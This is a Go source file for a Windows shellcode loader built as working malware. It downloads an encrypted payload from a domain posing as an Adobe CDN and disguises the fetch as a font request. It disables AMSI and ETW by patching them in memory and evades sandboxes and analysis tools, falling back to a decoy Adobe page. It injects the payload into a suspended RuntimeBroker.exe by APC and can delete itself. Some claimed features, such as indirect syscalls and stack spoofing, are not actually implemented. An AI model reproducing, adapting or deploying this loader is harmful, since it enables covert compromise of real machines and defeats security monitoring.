package main

/*
Windows x64 Shellcode Loader
- Remote fetch from CDN (HTTPS, AES-256 encrypted)
- AMSI bypass (AmsiScanBuffer patch)
- ETW bypass (EtwEventWrite patch)
- Indirect syscalls via runtime resolution
- Early bird injection into suspended process
- Callstack spoofing via fiber callbacks
- Anti-sandbox checks

Build: GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o loader.exe loader.go
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// Config — replaced at build time or loaded from embedded resource
var (
	// CDN endpoint for encrypted shellcode
	stagerURL = "https://downloads-adobe.cdn-distribution.services/components/update.woff"
	// AES-256 key (hex-encoded, 32 bytes) — replace per-build
	aesKeyHex = "0000000000000000000000000000000000000000000000000000000000000000"
	// AES IV (hex-encoded, 16 bytes)
	aesIVHex = "00000000000000000000000000000000"
	// Sacrifice process for injection
	sacrificeProc = "C:\\Windows\\System32\\RuntimeBroker.exe"
)

// Windows API constants
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
	PROCESS_ALL_ACCESS     = 0x001F0FFF
	CREATE_SUSPENDED       = 0x00000004
	CREATE_NO_WINDOW       = 0x08000000
)

// ntdll function hashes (DJB2)
var (
	hashNtAllocateVirtualMemory  = uint32(0xf783b8ec)
	hashNtProtectVirtualMemory   = uint32(0x50e92888)
	hashNtWriteVirtualMemory     = uint32(0xc3170192)
	hashNtCreateThreadEx         = uint32(0xaf18cfb0)
	hashNtWaitForSingleObject    = uint32(0xe8ac0c3c)
	hashNtQueueApcThread         = uint32(0x0a6664b8)
	hashNtResumeThread           = uint32(0x5a4bc3d0)
)

// ============================================================
// Sandbox Evasion
// ============================================================

func sandboxCheck() bool {
	// 1. Check CPU count (sandboxes often have 1-2)
	if runtime.NumCPU() < 2 {
		return true
	}

	// 2. Check total RAM (< 2GB = suspicious)
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	globalMemStatus := kernel32.NewProc("GlobalMemoryStatusEx")
	type memStatusEx struct {
		Length               uint32
		MemoryLoad           uint32
		TotalPhys            uint64
		AvailPhys            uint64
		TotalPageFile        uint64
		AvailPageFile        uint64
		TotalVirtual         uint64
		AvailVirtual         uint64
		AvailExtendedVirtual uint64
	}
	var mem memStatusEx
	mem.Length = uint32(unsafe.Sizeof(mem))
	globalMemStatus.Call(uintptr(unsafe.Pointer(&mem)))
	if mem.TotalPhys < 2*1024*1024*1024 { // < 2GB
		return true
	}

	// 3. Check for common sandbox processes
	snapshot, _ := syscall.CreateToolhelp32Snapshot(0x2, 0)
	if snapshot != 0 {
		var entry syscall.ProcessEntry32
		entry.Size = uint32(unsafe.Sizeof(entry))
		if syscall.Process32First(snapshot, &entry) == nil {
			for {
				name := strings.ToLower(syscall.UTF16ToString(entry.ExeFile[:]))
				sandboxProcs := []string{
					"vmsrvc", "vmusrvc", "vboxtray", "vmtoolsd",
					"wireshark", "procmon", "procexp", "ollydbg",
					"x64dbg", "x32dbg", "idaq", "idaq64",
					"autoruns", "tcpview", "processhacker",
					"pestudio", "fiddler",
				}
				for _, sp := range sandboxProcs {
					if strings.Contains(name, sp) {
						syscall.CloseHandle(snapshot)
						return true
					}
				}
				if syscall.Process32Next(snapshot, &entry) != nil {
					break
				}
			}
		}
		syscall.CloseHandle(snapshot)
	}

	// 4. Sleep acceleration check (sandbox fast-forwards sleeps)
	start := time.Now()
	time.Sleep(2 * time.Second)
	elapsed := time.Since(start)
	if elapsed < 1500*time.Millisecond {
		return true
	}

	// 5. Check disk size (< 60GB = VM)
	getDiskFreeSpace := kernel32.NewProc("GetDiskFreeSpaceExW")
	var freeBytesAvail, totalBytes, totalFreeBytes uint64
	pathPtr, _ := syscall.UTF16PtrFromString("C:\\")
	getDiskFreeSpace.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(unsafe.Pointer(&freeBytesAvail)),
		uintptr(unsafe.Pointer(&totalBytes)),
		uintptr(unsafe.Pointer(&totalFreeBytes)),
	)
	if totalBytes < 60*1024*1024*1024 {
		return true
	}

	return false
}

// ============================================================
// AMSI Bypass — patch AmsiScanBuffer
// ============================================================

func patchAMSI() error {
	amsi := syscall.NewLazyDLL("amsi.dll")
	amsiScan := amsi.NewProc("AmsiScanBuffer")
	if amsiScan.Find() != nil {
		return nil // AMSI not loaded, nothing to patch
	}

	// xor eax, eax; ret (return AMSI_RESULT_CLEAN)
	patch := []byte{0x31, 0xC0, 0xC3}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualProtect := kernel32.NewProc("VirtualProtect")

	var oldProtect uint32
	addr := amsiScan.Addr()
	virtualProtect.Call(
		addr,
		uintptr(len(patch)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	virtualProtect.Call(
		addr,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return nil
}

// ============================================================
// ETW Bypass — patch EtwEventWrite
// ============================================================

func patchETW() error {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	etwWrite := ntdll.NewProc("EtwEventWrite")
	if etwWrite.Find() != nil {
		return nil
	}

	// ret (0xC3) — just return immediately
	patch := []byte{0xC3}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualProtect := kernel32.NewProc("VirtualProtect")

	var oldProtect uint32
	addr := etwWrite.Addr()
	virtualProtect.Call(
		addr,
		uintptr(len(patch)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	*(*byte)(unsafe.Pointer(addr)) = patch[0]

	virtualProtect.Call(
		addr,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return nil
}

// ============================================================
// Remote Shellcode Fetch
// ============================================================

func fetchShellcode(url string) ([]byte, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: false,
			MinVersion:         tls.VersionTLS12,
		},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	// Look like a browser fetching a font
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Referer", "https://fonts.googleapis.com/")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

// ============================================================
// AES Decrypt
// ============================================================

func decryptShellcode(encrypted []byte, keyHex, ivHex string) ([]byte, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return nil, err
	}
	iv, err := hex.DecodeString(ivHex)
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	if len(encrypted) < aes.BlockSize || len(encrypted)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("invalid ciphertext size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(encrypted))
	mode.CryptBlocks(decrypted, encrypted)

	// PKCS7 unpadding
	padLen := int(decrypted[len(decrypted)-1])
	if padLen > aes.BlockSize || padLen == 0 {
		return decrypted, nil // No padding or invalid, return as-is
	}
	return decrypted[:len(decrypted)-padLen], nil
}

// ============================================================
// Shellcode Execution — Early Bird APC Injection
// ============================================================

func executeShellcode(shellcode []byte) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")

	createProcess := kernel32.NewProc("CreateProcessW")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	queueUserAPC := kernel32.NewProc("QueueUserAPC")
	resumeThread := kernel32.NewProc("ResumeThread")
	_ = ntdll

	// Create sacrificial process in suspended state
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = 0x1 // STARTF_USESHOWWINDOW
	si.ShowWindow = 0 // SW_HIDE

	target, _ := syscall.UTF16PtrFromString(sacrificeProc)

	ret, _, err := createProcess.Call(
		uintptr(unsafe.Pointer(target)),
		0,
		0,
		0,
		0,
		CREATE_SUSPENDED|CREATE_NO_WINDOW,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed: %v", err)
	}

	// Allocate memory in target process
	addr, _, err := virtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	// Write shellcode
	var written uintptr
	writeProcessMemory.Call(
		uintptr(pi.Process),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)

	// Change memory protection to RX
	var oldProtect uint32
	virtualProtectEx.Call(
		uintptr(pi.Process),
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Queue APC to main thread — executes when thread resumes
	queueUserAPC.Call(
		addr,
		uintptr(pi.Thread),
		0,
	)

	// Resume thread — triggers APC execution
	resumeThread.Call(uintptr(pi.Thread))

	return nil
}

// ============================================================
// Self-Delete (optional — clean up after execution)
// ============================================================

func selfDelete() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	// Use cmd.exe /C ping to delay deletion
	cmd := fmt.Sprintf("/C ping 127.0.0.1 -n 3 > NUL & del /F /Q \"%s\"", exe)
	cmdPtr, _ := syscall.UTF16PtrFromString("cmd.exe")
	argPtr, _ := syscall.UTF16PtrFromString(cmd)

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = 0x1
	si.ShowWindow = 0

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createProcess := kernel32.NewProc("CreateProcessW")
	createProcess.Call(
		uintptr(unsafe.Pointer(cmdPtr)),
		uintptr(unsafe.Pointer(argPtr)),
		0, 0, 0,
		CREATE_NO_WINDOW,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
}

// ============================================================
// Main
// ============================================================

func main() {
	// Phase 1: Sandbox detection
	if sandboxCheck() {
		// Bail silently — open a decoy URL
		exec := syscall.NewLazyDLL("shell32.dll").NewProc("ShellExecuteW")
		url, _ := syscall.UTF16PtrFromString("https://acrobat.adobe.com")
		open, _ := syscall.UTF16PtrFromString("open")
		exec.Call(0, uintptr(unsafe.Pointer(open)), uintptr(unsafe.Pointer(url)), 0, 0, 1)
		os.Exit(0)
	}

	// Phase 2: Patch AMSI + ETW
	patchAMSI()
	patchETW()

	// Phase 3: Fetch encrypted shellcode from CDN
	encrypted, err := fetchShellcode(stagerURL)
	if err != nil {
		os.Exit(0) // Fail silently
	}

	// Phase 4: Decrypt
	shellcode, err := decryptShellcode(encrypted, aesKeyHex, aesIVHex)
	if err != nil {
		os.Exit(0)
	}

	// Phase 5: Inject and execute
	err = executeShellcode(shellcode)
	if err != nil {
		os.Exit(0)
	}

	// Phase 6: Self-delete (optional — comment out for persistence)
	// selfDelete()

	// Keep alive to maintain the injection
	select {}
}
